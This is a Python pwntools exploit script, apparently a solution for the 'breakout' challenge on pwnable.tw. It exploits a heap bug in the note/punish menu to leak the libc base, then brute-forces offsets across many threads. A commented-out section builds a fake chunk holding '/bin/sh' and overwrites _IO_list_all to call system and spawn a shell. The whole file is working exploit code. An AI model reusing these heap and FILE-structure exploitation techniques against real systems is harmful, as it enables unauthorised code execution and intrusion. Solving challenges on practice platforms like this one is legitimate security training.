from pwn import *
import threading

e = ELF("./breakout")
libc = ELF("./libc.so.6")

def do(ite):
  global e, libc
  if "--remote" in sys.argv:
    p = remote("chall.pwnable.tw", 10400)
  else:
    p = process(e.path, env={"LD_PRELOAD": libc.path})

  def alloc(cell, size, msg):
    p.sendline("note")
    p.sendlineafter("Cell:", str(cell))
    p.sendlineafter("Size:", str(size))
    p.sendafter("Note:", msg)
    p.recvuntil(">")

  p.recvuntil(">")
  p.sendline("note")
  p.sendlineafter("Cell:", "0")
  p.sendlineafter("Size:", "196608")
  p.recvuntil(">")

  alloc(1, 0x28, "AAAA")

  p.sendline("punish")
  p.sendlineafter("Cell:", "1")
  p.recvuntil(">")

  alloc(2, 0x40, p64(0) * 3 + p32(0) + p32(1337) + "\x50")

  p.sendline("list")
  p.recvuntil("Cell: 1337")
  p.recvuntil("Sentence: ")

  libc_base = u64(p.recvline(keepends=False).ljust(8, "\x00")) - 0x10 - ite * 0x1000
  print("{:#x}".format(libc_base))

  p.recvuntil(">")

  alloc(2, 0x48, p64(0) * 3 + p32(0) + p32(1337) + p64(libc_base) + p64(0) *2 + p64(0)[:6])

  p.sendline("list")
  try:
    p.recvuntil("Cell: 1337", timeout=1)
  except Exception as e:
    p.close()
    raise e
  p.recvuntil("Sentence: ")

  header = p.recvline(keepends=False)

  if header.startswith("\x7fELF"):
    print("SOLVED")
    print(hex(ite))
    print(hex(0x10 + ite * 0x1000))
    p.interactive()
  else:
		p.close()
		raise ValueError

  """
  p.sendline("list")
  p.recvuntil("Cell: 1337")
  p.recvuntil("Sentence: ")

  heap_base = u64(p.recvline(keepends=False).ljust(8, "\x00")) + 0x000055b728988000 - 0x55b72899a870
  print("{:#x}".format(heap_base))

  p.recvuntil(">")


  m = "A" * 8
  fake_chunk = "/bin/sh\x00" + m
  fake_chunk += m + m 
  fake_chunk += p64(0) + p64(1)
  fake_chunk = fake_chunk.ljust(0xc0, "\x00")
  fake_chunk += p64(0)

  payload = fake_chunk
  payload += p64(0) * 2
  payload += p64(heap_base + 0x00005626bb615880 - 0x5626bb603000)

  alloc(3, 0x80, p64(0) * 3 + p64(libc_base + libc.symbols["system"]))

  alloc(2, 0x40, p64(0) * 3 + p32(0) + p32(1337) + p64(0) + p64(0) + p64(0) + p64(libc_base + libc.symbols["_IO_list_all"] - 0x30))
  alloc(0, len(payload), payload)


  p.interactive()
  """

def do_helper(i):
	try:
		do(i)	
		exit()
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(e)
		pass
	try:
		do(-i)	
		exit()
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(e)
		pass
	

cnt = 0x10
for i in range(0x80, 0x100):
	print("Trying " + str(i))
	threads = []
	for j in range(cnt):
		t = threading.Thread(target=do_helper, args=(i * cnt + j,))
		t.start()
		threads.append(t)
	
	for t in threads:
		t.join()
